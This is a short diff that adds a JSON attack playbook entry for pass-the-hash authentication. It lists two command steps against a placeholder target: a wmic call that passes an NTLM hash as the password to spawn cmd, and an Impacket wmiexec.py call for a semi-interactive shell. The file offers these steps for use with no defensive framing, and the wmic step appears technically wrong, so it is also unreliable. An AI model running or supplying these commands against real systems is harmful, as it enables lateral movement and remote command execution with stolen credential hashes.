@@ -1,0 +1,19 @@
+{
+	"name": "Hash-Based Authentication (PtH)",
+	"description": "Authenticate to services using NTLM hashes instead of passwords.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "WMI with Hash",
+			"command": "wmic /node:TARGET /user:admin /password:aad3b435b51404eeaad3b435b51404ee:NTLMHASH process call create \"cmd\"",
+			"description": "Direct hash usage."
+		},
+		{
+			"index": 2,
+			"name": "Impacket WMI Exec",
+			"command": "wmiexec.py -hashes :NTLMHASH corp/admin@TARGET whoami",
+			"description": "Semi-interactive shell."
+		}
+	]
+}
